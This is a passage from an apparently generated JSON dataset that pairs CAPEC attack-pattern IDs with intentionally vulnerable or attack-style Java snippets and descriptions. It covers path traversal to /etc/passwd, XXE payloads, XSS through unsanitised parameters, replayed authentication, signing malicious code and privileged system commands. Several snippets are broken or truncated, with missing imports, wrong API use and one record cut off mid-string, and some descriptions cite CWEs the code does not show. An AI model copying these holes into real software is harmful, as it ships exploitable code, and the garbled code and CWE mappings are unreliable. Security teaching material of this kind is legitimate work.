        "code_snippet": "import java.net.URL;\nimport java.net.HttpURLConnection;\nimport java.io.DataOutputStream;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class AuthenticationBypass {\n    public static void main(String[] args) throws Exception {\n        URL url = new URL(\"http://example.com/authenticatedResource\");\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"POST\");\n        connection.setDoOutput(true);\n\n        // CWE-522: Insufficiently Protected Credentials\n        String credentials = \"username:password\";\n        String basicAuth = \"Basic \" + javax.xml.bind.DatatypeConverter.printBase64Binary(credentials.getBytes());\n        connection.setRequestProperty(\"Authorization\", basicAuth);\n\n        // CWE-294: Authentication Bypass by Capture-replay\n        String capturedRequest = \"captured_request_from_network_traffic\";\n        DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());\n        outputStream.writeBytes(capturedRequest);\n        outputStream.flush();\n        outputStream.close();\n\n        // CWE-603: Use of Client-Side Authentication\n        // Bypass server-side authentication by modifying the client\n        String response = \"\";\n        int responseCode = connection.getResponseCode();\n        if (responseCode == 200) {\n            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                response += inputLine;\n            }\n            in.close();\n        }\n        System.out.println(response);\n    }\n}",
        "description": "This Java code snippet demonstrates the deprecated CAPEC pattern of retrieving embedded sensitive data, which is a duplicate of CAPEC-37. It showcases multiple CWEs, including CWE-522 (Insufficiently Protected Credentials) by transmitting credentials in plain text, CWE-294 (Authentication Bypass by Capture-replay) by replaying captured network traffic to bypass authentication, and CWE-603 (Use of Client-Side Authentication) by modifying the client to omit server-side authentication checks."
    },
    {
        "capec_id": "206",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.security.KeyFactory;\nimport java.security.PrivateKey;\nimport java.security.spec.PKCS8EncodedKeySpec;\nimport java.util.jar.JarEntry;\nimport java.util.jar.JarFile;\n\npublic class MaliciousCodeSigner {\n    public static void main(String[] args) throws Exception {\n        // CWE-798: Hard-coded credentials\n        String privateKeyPath = \"path/to/private/key\";\n        String privateKeyPassword = \"hardcoded_password\";\n\n        // CWE-732: Incorrect permission assignment\n        File privateKeyFile = new File(privateKeyPath);\n        if (!privateKeyFile.setReadable(true, false)) {\n            throw new IOException(\"Failed to set permissions\");\n        }\n\n        // Load private key\n        FileInputStream fis = new FileInputStream(privateKeyFile);\n        byte[] encodedKey = new byte[(int) privateKeyFile.length()];\n        fis.read(encodedKey);\n        fis.close();\n\n        PKCS8EncodedKeySpec keySpec = new PKCS8EncodedKeySpec(encodedKey);\n        KeyFactory kf = KeyFactory.getInstance(\"RSA\");\n        PrivateKey privateKey = kf.generatePrivate(keySpec);\n\n        // CWE-494: Download of code without integrity check\n        JarFile jarFile = new JarFile(\"path/to/malicious/jar\");\n        JarEntry jarEntry = jarFile.getJarEntry(\"MaliciousClass.class\");\n        byte[] classBytes = new byte[(int) jarEntry.getSize()];\n        jarFile.getInputStream(jarEntry).read(classBytes);\n\n        // Sign malicious code with extracted credentials\n        // CWE-506: Embedded malicious code\n        byte[] signedBytes = signCode(privateKey, classBytes);\n\n        // CWE-603: Use of client-side authentication\n        // Assume client-side authentication is bypassed, and the malicious code is executed\n        // on the victim's computer\n    }\n\n    private static byte[] signCode(PrivateKey privateKey, byte[] codeBytes) throws Exception {\n        // Implement code signing logic here\n        return codeBytes;\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC, where an adversary extracts credentials used for code signing from a production environment and uses them to sign malicious content. The code includes CWEs such as hard-coded credentials, incorrect permission assignment, download of code without integrity check, embedded malicious code, and use of client-side authentication."
    },
    {
        "capec_id": "207",
        "code_snippet": "public class VulnerableServer {\n    public static void main(String[] args) {\n        String clientResponse = getClientResponse();\n        if (clientResponse.equals(\"authenticated\")) {\n            // grant access to sensitive data\n            System.out.println(\"Access granted.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n\n    public static String getClientResponse() {\n        // assume client has implemented authentication mechanism\n        return System.getProperty(\"clientResponse\");\n    }\n}\n\npublic class MaliciousClient {\n    public static void main(String[] args) {\n        System.setProperty(\"clientResponse\", \"authenticated\");\n        VulnerableServer.main(new String[0]);\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of an adversary removing or disabling functionality on the client that the server assumes to be present and trustworthy. The server (VulnerableServer) relies on the client to implement an authentication mechanism and trusts the client's response. The malicious client (MaliciousClient) can bypass the authentication by setting the clientResponse property to 'authenticated', allowing access to sensitive data. This code embodies CWE-602 (Client-Side Enforcement of Server-Side Security), CWE-603 (Use of Client-Side Authentication), CWE-807 (Reliance on Untrusted Inputs in a Security Decision), CWE-829 (Inclusion of Functionality from Untrusted Control Sphere), and CWE-494 (Download of Code Without Integrity Check)."
    },
    {
        "capec_id": "208",
        "code_snippet": "public class ShoppingCart {\n    private double totalPrice;\n    private int quantity;\n    private double itemPrice;\n\n    public ShoppingCart(double itemPrice) {\n        this.itemPrice = itemPrice;\n    }\n\n    public void setQuantity(int quantity) {\n        this.quantity = quantity;\n    }\n\n    public double calculateTotalPrice() {\n        // CWE-682: Incorrect Calculation\n        // CWE-1284: Improper Validation of Specified Quantity in Input\n        // CWE-115: Misinterpretation of Input\n        totalPrice = quantity * itemPrice;\n        return totalPrice;\n    }\n\n    public void sendOrderToServer() {\n        // CWE-602: Client-Side Enforcement of Server-Side Security\n        // CWE-784: Reliance on Cookies without Validation and Integrity Checking in a Security Decision\n        String cookieValue = getCookieValue(\"totalPrice\");\n        if (cookieValue != null) {\n            totalPrice = Double.parseDouble(cookieValue);\n        }\n        sendRequestToServer(totalPrice);\n    }\n\n    private String getCookieValue(String cookieName) {\n        // CWE-784: Reliance on Cookies without Validation and Integrity Checking in a Security Decision\n        // No validation or integrity checking of the cookie value\n        return \"100.0\"; // hardcoded cookie value\n    }\n\n    private void sendRequestToServer(double totalPrice) {\n        // Send the request to the server with the calculated total price\n        System.out.println(\"Sending request to server with total price: \" + totalPrice);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable shopping cart implementation that relies on client-side calculations and cookie-based validation, making it susceptible to attacks that manipulate the total price."
    },
    {
        "capec_id": "209",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.OutputStream;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String filename = req.getParameter(\"filename\");\n        File file = new File(filename);\n        if (file.exists()) {\n            resp.setContentType(\"text/plain\");\n            OutputStream out = resp.getOutputStream();\n            out.write(Files.readAllBytes(file.toPath()));\n            out.flush();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable servlet that allows an adversary to trick the victim into accessing a URL that responds with a script file. The servlet does not validate the filename parameter, allowing an attacker to upload a file with a malicious script. The servlet sets the MIME type to 'text/plain', but some browsers may detect the actual content type and execute the script, leading to cross-site scripting (CWE-79). The code also relies on the file name and extension to determine the behavior (CWE-646), and does not neutralize input during web page generation (CWE-20). Additionally, it does not neutralize script in attributes of IMG tags (CWE-82) or encoded URI schemes (CWE-84)."
    },
    {
        "capec_id": "211",
        "code_snippet": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String userInput = req.getParameter(\"input\");\n        String html = \"<img src='\" + userInput + \"' />\";\n        resp.setContentType(\"text/html\");\n        resp.getWriter().write(html);\n    }\n}\n\n// ActiveX control with exposed dangerous methods\npublic class UnsafeActiveX {\n    public void executeSystemCommand(String command) {\n        // execute system command\n    }\n}\n\n// J2EE Misconfiguration: Missing Custom Error Page\npublic class ErrorPageServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        resp.sendError(500, \"Internal Server Error: \" + req.getAttribute(\"javax.servlet.error.message\"));\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable servlet that is susceptible to Cross-Site Scripting (XSS) attacks due to incomplete denylist-based protection. The servlet takes user input and injects it into an HTML IMG tag without proper neutralization, allowing an attacker to inject malicious scripts. Additionally, an unsafe ActiveX control is exposed, which can be used to execute system commands. The code also includes a J2EE misconfiguration where the default error page displays sensitive information about the product."
    },
    {
        "capec_id": "212",
        "code_snippet": "public class UndocumentedFeatureExploiter {\n    public static void main(String[] args) {\n        // CWE-1242: Inclusion of Undocumented Features or Chicken Bits\n        // Using an undocumented feature to access sensitive system information\n        System.setProperty(\"sun.misc.ProxyGenerator.saveGeneratedFiles\", \"true\");\n        \n        // CWE-695: Use of Low-Level Functionality\n        // Using low-level functionality to access non-volatile memory\n        try {\n            Process p = Runtime.getRuntime().exec(\"hdparm -I /dev/sda\");\n            p.waitFor();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        \n        // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        // Exposing sensitive system information to an unauthorized control sphere\n        String osName = System.getProperty(\"os.name\");\n        String osArch = System.getProperty(\"os.arch\");\n        System.out.println(\"OS Name: \" + osName);\n        System.out.println(\"OS Architecture: \" + osArch);\n        \n        // CWE-1281: Sequence of Processor Instructions Leads to Unexpected Behavior\n        // Using a specific sequence of processor instructions to cause unexpected behavior\n        try {\n            Runtime.getRuntime().exec(\"sysctl -w kernel.sysrq=1\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of leveraging a legitimate capability of an application to achieve a negative technical impact. It uses undocumented features, low-level functionality, and exposes sensitive system information to unauthorized control spheres, ultimately leading to unexpected behavior."
    },
    {
        "capec_id": "213",
        "code_snippet": "public class PathTraversalVulnerability {\n    public static void getFile(String userInput) {\n        String basePath = \"resources/\";\n        String filePath = basePath + userInput;\n        File file = new File(filePath);\n        if (file.exists()) {\n            System.out.println(\"File found: \" + filePath);\n        } else {\n            System.out.println(\"File not found: \" + filePath);\n        }\n    }\n\n    public static void main(String[] args) {\n        getFile(\"../../../../etc/passwd\");\n    }\n}",
        "description": "This Java code snippet demonstrates a path traversal vulnerability. The getFile method takes user input and constructs a file path without properly sanitizing it. An attacker can provide a malicious input such as \"../../../../etc/passwd\" to access sensitive files outside of the intended directory."
    },
    {
        "capec_id": "214",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String userInput = req.getParameter(\"input\");\n        try {\n            // Direct use of sockets\n            java.net.Socket socket = new java.net.Socket(\"example.com\", 8080);\n            socket.getOutputStream().write(userInput.getBytes());\n            socket.close();\n        } catch (Exception e) {\n            // Missing custom error page\n            resp.sendError(500, e.getMessage());\n        }\n        // No input validation framework in use\n        if (userInput.equals(\"admin\")) {\n            resp.getWriter().println(\"Welcome, admin!\");\n        } else {\n            resp.getWriter().println(\"Invalid input\");\n        }\n        // Debug log files with sensitive information\n        System.out.println(\"User input: \" + userInput);\n        // Dynamic class loading\n        try {\n            Class<?> clazz = Class.forName(\"com.example.DynamicClass\");\n            clazz.getMethod(\"doSomething\", String.class).invoke(null, userInput);\n        } catch (Exception e) {\n            // No error handling\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable servlet that embodies the main idea of the deprecated CAPEC. It includes multiple CWEs, such as direct use of sockets (CWE-246), missing custom error page (CWE-7), lack of input validation framework (CWE-106), debug log files with sensitive information (CWE-534), and dynamic class loading (CWE-545)."
    },
    {
        "capec_id": "215",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.io.PrintWriter;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class FuzzingAttack {\n    private static Logger logger = Logger.getLogger(FuzzingAttack.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            FileHandler fh = new FileHandler(\\",
        "description": "This Java code snippet demonstrates a fuzzing attack, where an attacker sends random or malformed inputs to a target application and observes the error messages returned. The code generates error messages that contain sensitive information, such as input values and exception messages, and logs them to a file. This can lead to exposure of sensitive system information to an unauthorized control sphere (CWE-497). The code also inserts sensitive information into log files (CWE-532) and generates error messages that contain sensitive information (CWE-209, CWE-210, CWE-211)."
    },
    {
        "capec_id": "216",
        "code_snippet": "import java.net.Socket;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\n\npublic class VulnerableCommunication {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"example.com\", 8080);\n        DataInputStream in = new DataInputStream(socket.getInputStream());\n        DataOutputStream out = new DataOutputStream(socket.getOutputStream());\n\n        // CWE-306: Missing Authentication for Critical Function\n        String username = \"admin\";\n        String password = \"password\";\n        out.writeUTF(username);\n        out.writeUTF(password);\n\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        String message = \"Hello, server!\";\n        out.writeUTF(message);\n        String response = in.readUTF();\n        System.out.println(response);\n\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        String request = \"GET /secret_data HTTP/1.1\";\n        out.writeUTF(request);\n        response = in.readUTF();\n        System.out.println(response);\n\n        // CWE-300: Channel Accessible by Non-Endpoint\n        socket.setTcpNoDelay(true);\n        out.writeUTF(\"Malicious data from non-endpoint\");\n\n        // CWE-514: Covert Channel\n        String covertMessage = \"Hidden message\";\n        out.writeUTF(covertMessage);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable communication channel that lacks authentication, message integrity, and proper source verification, making it accessible to non-endpoints and susceptible to covert channels."
    },
    {
        "capec_id": "217",
        "code_snippet": "import javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLSocketFactory;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.PrintWriter;\nimport java.net.Socket;\n\npublic class InsecureSSLClient {\n    public static void main(String[] args) throws Exception {\n        SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n        sslContext.init(null, null, null);\n        SSLSocketFactory factory = sslContext.getSocketFactory();\n        Socket socket = factory.createSocket(\"example.com\", 443);\n        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n        BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n        out.println(\"GET / HTTP/1.1\\nHost: example.com\\n\\n\");\n        String line;\n        while ((line = in.readLine()) != null) {\n            System.out.println(line);\n        }\n        socket.close();\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable SSL/TLS client that does not properly verify the identity of the server, allowing an adversary to intercept and modify the communication. The code uses a custom SSLContext without verifying the server's certificate, making it vulnerable to man-in-the-middle attacks. This code embodies the CAPEC and CWEs by transmitting sensitive information (CWE-201), allowing authentication bypass by capture-replay (CWE-294), not restricting the communication channel to the intended endpoint (CWE-923), relying on client-side enforcement of server-side security (CWE-602), and not verifying the source of the communication channel (CWE-940)."
    },
    {
        "capec_id": "218",
        "code_snippet": "import java.io.StringReader;\nimport javax.xml.XMLConstants;\nimport javax.xml.bind.JAXBContext;\nimport javax.xml.bind.Unmarshaller;\nimport javax.xml.bind.ValidationEventHandler;\nimport javax.xml.validation.Schema;\nimport javax.xml.validation.SchemaFactory;\n\npublic class UDDISpoofing {\n    public static void main(String[] args) throws Exception {\n        String xml = \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?><businessService businessKey=\\\"123456\\\"><name>Legitimate Business</name><description>This is a legitimate business.</description><bindingTemplates><bindingTemplate><accessPoint><accessPointURL>http://legitimatebusiness.com</accessPointURL></accessPoint></bindingTemplate></bindingTemplates></businessService>\";\n        JAXBContext jaxbContext = JAXBContext.newInstance(BusinessService.class);\n        Unmarshaller unmarshaller = jaxbContext.createUnmarshaller();\n        // CWE-112: Missing XML Validation\n        // The XML is not validated against a schema, allowing an attacker to inject malicious XML.\n        unmarshaller.setEventHandler(new ValidationEventHandler() {\n            @Override\n            public boolean handleEvent(ValidationEvent event) {\n                return true;\n            }\n        });\n        BusinessService businessService = (BusinessService) unmarshaller.unmarshal(new StringReader(xml));\n        // CWE-345: Insufficient Verification of Data Authenticity\n        // The authenticity of the businessService object is not verified, allowing an attacker to impersonate a legitimate business.\n        if (businessService.getName().equals(\"Legitimate Business\")) {\n            System.out.println(\"Transaction successful.\");\n        }\n        // CWE-941: Incorrectly Specified Destination in a Communication Channel\n        // The destination URL is not verified, allowing an attacker to manipulate the protocols used between the client and business.\n        String url = businessService.getBindingTemplates().get(0).getAccessPoint().getAccessPointURL();\n        System.out.println(\"Access point URL: \" + url);\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        // The message integrity is not ensured during transmission, allowing an attacker to modify the message.\n        // CWE-300: Channel Accessible by Non-Endpoint\n        // The channel is not adequately secured, allowing an attacker to access or influence the channel.\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of spoofing a UDDI message to impersonate a service provider in an e-business transaction. It uses the related CWEs to highlight the vulnerabilities: CWE-112 (Missing XML Validation), CWE-345 (Insufficient Verification of Data Authenticity), CWE-941 (Incorrectly Specified Destination in a Communication Channel), CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel), and CWE-300 (Channel Accessible by Non-Endpoint)."
    },
    {
        "capec_id": "219",
        "code_snippet": "import javax.xml.soap.SOAPMessage;\nimport javax.xml.soap.SOAPPart;\nimport javax.xml.transform.Source;\nimport javax.xml.transform.Transformer;\nimport javax.xml.transform.TransformerFactory;\nimport javax.xml.transform.stream.StreamSource;\nimport java.io.StringReader;\n\npublic class XMLRoutingDetourAttack {\n    public static void processXMLMessage(String xmlMessage) {\n        try {\n            // CWE-112: Missing XML Validation\n            // No XML validation against a proper schema\n            Source xmlSource = new StreamSource(new StringReader(xmlMessage));\n            TransformerFactory factory = TransformerFactory.newInstance();\n            Transformer transformer = factory.newTransformer();\n            // CWE-611: Improper Restriction of XML External Entity Reference\n            // XML entity with URI that resolves to a document outside of the intended sphere of control\n            transformer.transform(xmlSource, new StreamSource(\"http://example.com/malicious-entity.dtd\"));\n            // CWE-643: Improper Neutralization of Data within XPath Expressions ('XPath Injection')\n            // Dynamically constructed XPath expression with untrusted input\n            String xpathExpression = \"//\" + xmlMessage.substring(0, 10) + \"\";\n            // CWE-610: Externally Controlled Reference to a Resource in Another Sphere\n            // Externally controlled name or reference that resolves to a resource outside of the intended control sphere\n            transformer.setParameter(\"http://example.com/external-resource\", \"http://example.com/malicious-resource\");\n            // CWE-441: Unintended Proxy or Intermediary ('Confused Deputy')\n            // Forwarding the request to an external actor without preserving the original source\n            SOAPMessage soapMessage = MessageFactory.newInstance().createMessage();\n            SOAPPart soapPart = soapMessage.getSOAPPart();\n            soapPart.setContent(transformer.transform(xmlSource, soapPart).getBytes());\n            // Forward the modified SOAP message to an external entity\n            dispatch(soapMessage);\n        } catch (Exception e) {\n            // Handle exception\n        }\n    }\n\n    private static void dispatch(SOAPMessage soapMessage) {\n        // Forward the modified SOAP message to an external entity\n        // Implementation omitted for brevity\n    }\n}",
        "description": "This Java code snippet demonstrates an XML Routing Detour Attack, where an attacker compromises an intermediate system used to process XML content and forces the intermediate to modify and/or re-route the processing of the content. The code includes vulnerabilities related to CWE-112 (Missing XML Validation), CWE-611 (Improper Restriction of XML External Entity Reference), CWE-643 (Improper Neutralization of Data within XPath Expressions), CWE-610 (Externally Controlled Reference to a Resource in Another Sphere), and CWE-441 (Unintended Proxy or Intermediary)."
    },
    {
        "capec_id": "220",
        "code_snippet": "import java.net.Socket;\nimport java.io.DataOutputStream;\nimport java.io.DataInputStream;\nimport javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\n\npublic class InsecureCommunication {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"localhost\", 8080);\n        DataOutputStream dout = new DataOutputStream(socket.getOutputStream());\n        DataInputStream din = new DataInputStream(socket.getInputStream());\n\n        // CWE-757: Using a weaker encryption algorithm (DES) instead of a stronger one (AES)\n        KeyGenerator kgen = KeyGenerator.getInstance(\"DES\");\n        SecretKey skey = kgen.generateKey();\n        Cipher cipher = Cipher.getInstance(\"DES\");\n        cipher.init(Cipher.ENCRYPT_MODE, skey);\n\n        // CWE-602: Client-side enforcement of server-side security\n        dout.writeUTF(\"Authentication successful\");\n        dout.flush();\n\n        // CWE-294: Authentication bypass by capture-replay\n        String capturedMessage = din.readUTF();\n        dout.writeUTF(capturedMessage);\n        dout.flush();\n\n        // CWE-941: Incorrectly specified destination in a communication channel\n        dout.writeUTF(\"http://malicious-destination.com\");\n        dout.flush();\n\n        // CWE-246: Direct use of sockets instead of using framework method calls\n        socket.close();\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting weaknesses in communication protocols. It includes CWE-757 by using a weaker encryption algorithm, CWE-602 by relying on client-side enforcement of server-side security, CWE-294 by allowing authentication bypass through capture-replay, CWE-941 by incorrectly specifying the destination in a communication channel, and CWE-246 by directly using sockets instead of framework method calls."
    },
    {
        "capec_id": "221",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport org.w3c.dom.Element;\n\npublic class XMLDoS {\n    public static void main(String[] argv) {\n        try {\n            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n            dbf.setExpandEntityReferences(true);\n            DocumentBuilder db = dbf.newDocumentBuilder();\n            String xml = \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\\n\" +\n                       \"<!DOCTYPE foo [\\n\" +\n                       \"<!ENTITY xxe SYSTEM \\\"http://example.com/malicious\\\">\\n\" +\n                       \"<!ELEMENT foo ANY >\\n\" +\n                       \"<!ATTLIST foo foo CDATA \\\"foo\\\">\\n\" +\n                       \"]>\\n\" +\n                       \"<foo>&xxe;</foo>\";\n            Document doc = db.parse(new java.io.ByteArrayInputStream(xml.getBytes()));\n            Element element = doc.getDocumentElement();\n            System.out.println(element.getTextContent());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a denial of service attack via XML entity expansion. It creates an XML document with an entity reference to an external URI, which can cause the system to consume a large amount of resources, leading to a denial of service condition. The code uses the DocumentBuilderFactory and DocumentBuilder classes to parse the XML document, with entity references expanded. This code is vulnerable to CWE-611 (Improper Restriction of XML External Entity Reference), CWE-99 (Improper Control of Resource Identifiers), CWE-646 (Reliance on File Name or Extension of Externally-Supplied File), CWE-594 (J2EE Framework: Saving Unserializable Objects to Disk), and CWE-433 (Unparsed Raw Web Content Delivery)."
    },
    {
        "capec_id": "222",
        "code_snippet": "import javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends javax.servlet.http.HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String iframeSrc = request.getParameter(\"iframeSrc\");\n        String userInput = request.getParameter(\"userInput\");\n\n        response.setContentType(\"text/html\");\n\n        String html = \"<html><body>\";\n        html += \"<iframe src='\" + iframeSrc + \"' width='100%' height='100%'></iframe>\";\n        html += \"<script>document.write('<img src='' onerror='alert(\"XSS\")' />');</script>\";\n        html += \"<h1>Welcome, \" + userInput + \"!</h1>\";\n        html += \"</body></html>\";\n\n        response.getWriter().write(html);\n    }\n}",
        "description": "This Java code snippet demonstrates an iFrame overlay attack, which is a type of UI redressing attack. The servlet takes two parameters: iframeSrc and userInput. The iframeSrc parameter is used to set the source of an iframe, which can be controlled by an attacker to overlay a malicious UI on top of the legitimate one. The userInput parameter is not properly sanitized, allowing for a cross-site scripting (XSS) attack. The servlet then generates an HTML page that includes the iframe and the user input, which can be used to trick the user into performing unintended actions."
    },
    {
        "capec_id": "224",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class Fingerprinting {\n    public static void main(String[] args) {\n        InetAddress inetAddress;\n        try {\n            inetAddress = InetAddress.getLocalHost();\n            System.out.println(\"OS Name: \" + System.getProperty(\"os.name\"));\n            System.out.println(\"OS Version: \" + System.getProperty(\"os.version\"));\n            System.out.println(\"Java Version: \" + System.getProperty(\"java.version\"));\n            System.out.println(\"Hostname: \" + inetAddress.getHostName());\n            System.out.println(\"IP Address: \" + inetAddress.getHostAddress());\n        } catch (UnknownHostException e) {\n            System.out.println(\"UnknownHostException: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the concept of fingerprinting, where an adversary can gather sensitive information about the target system, including the operating system name and version, Java version, hostname, and IP address. This information can be used to identify potential vulnerabilities in the system. The code uses the InetAddress and System classes to retrieve this information, which is then printed to the console. This code embodies CWE-200, CWE-497, CWE-1323, CWE-207, and CWE-1313, as it exposes sensitive system information to unauthorized actors and does not properly prevent access to this information."
    },
    {
        "capec_id": "226",
        "code_snippet": "public class VulnerableSessionManager {\n    private Map<String, String> sessions = new HashMap<>();\n    \n    public void createSession(String username, String password) {\n        String sessionId = generateSessionId();\n        sessions.put(sessionId, username);\n        Cookie cookie = new Cookie(\"sessionId\", sessionId);\n        // Send the cookie to the client\n    }\n    \n    public boolean isValidSession(Cookie cookie) {\n        String sessionId = cookie.getValue();\n        return sessions.containsKey(sessionId);\n    }\n    \n    public void authenticate(String sessionId) {\n        if (isValidSession(new Cookie(\"sessionId\", sessionId))) {\n            // Grant access to the application\n        }\n    }\n    \n    private String generateSessionId() {\n        // Generate a random session ID\n        return UUID.randomUUID().toString();\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable session management system. It creates a session ID and stores it in a cookie without proper validation and integrity checking (CWE-565). The session ID is not properly verified, allowing an attacker to manipulate the cookie and gain unauthorized access (CWE-472). The system also does not invalidate existing session IDs, making it vulnerable to session fixation attacks (CWE-384). Furthermore, the session IDs do not expire, allowing an attacker to reuse old session credentials (CWE-613). Finally, the authentication is performed on the client-side, making it possible for an attacker to bypass server-side authentication by modifying the client code (CWE-603)."
    },
    {
        "capec_id": "227",
        "code_snippet": "public class ResourceTieUp {\n    private static final int MAX_CONCURRENT_REQUESTS = 100;\n    private static final int REQUEST_TIMEOUT = 30000;\n    private static final ExecutorService executor = Executors.newFixedThreadPool(MAX_CONCURRENT_REQUESTS);\n\n    public static void main(String[] args) {\n        for (int i = 0; i < 1000; i++) {\n            executor.submit(new ResourceIntensiveTask());\n        }\n    }\n\n    private static class ResourceIntensiveTask implements Runnable {\n        @Override\n        public void run() {\n            try {\n                // Simulate a resource-intensive operation\n                Thread.sleep(REQUEST_TIMEOUT);\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n            }\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable code that embodies the CAPEC of tying up a resource to deny legitimate users access. The code creates a fixed thread pool of 100 threads and submits 1000 resource-intensive tasks to be executed concurrently. Each task simulates a resource-intensive operation by sleeping for 30 seconds, effectively tying up the thread and preventing it from processing other requests. This can lead to uncontrolled resource consumption (CWE-400), allocation of resources without limits or throttling (CWE-770), and insufficient control of network message volume (CWE-406). The code also lacks proper authorization checks (CWE-285), allowing an attacker to abuse the system. The creation of emergent resources (CWE-1229) is also possible if the attacker can manipulate the system to create new resources that can be used to further exploit the system."
    },
    {
        "capec_id": "228",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport org.xml.sax.InputSource;\n\npublic class XMLParser {\n    public static void parseXML(String xml) throws Exception {\n        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n        factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", false);\n        DocumentBuilder builder = factory.newDocumentBuilder();\n        Document doc = builder.parse(new InputSource(new StringReader(xml)));\n        // Process the XML document\n    }\n\n    public static void main(String[] args) throws Exception {\n        String maliciousXML = \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\\n\" +\n                         \"<!DOCTYPE foo [\\n\" +\n                         \"  <!ELEMENT foo ANY >\\n\" +\n                         \"  <!ENTITY xxe SYSTEM \\\"http://example.com/malicious.dtd\\\" >\\n\" +\n                         \"]>\\n\" +\n                         \"<foo>&xxe;</foo>\";\n        parseXML(maliciousXML);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable XML parser that is susceptible to XML Entity Expansion attacks. The parser does not restrict the inclusion of external DTDs, allowing an attacker to inject a malicious DTD that can cause resource depletion. The CWEs embodied in this code snippet include CWE-829 (Inclusion of Functionality from Untrusted Control Sphere), CWE-776 (Improper Restriction of Recursive Entity References in DTDs), CWE-827 (Improper Control of Document Type Definition), CWE-611 (Improper Restriction of XML External Entity Reference), and CWE-91 (XML Injection)."
    },
    {
        "capec_id": "229",
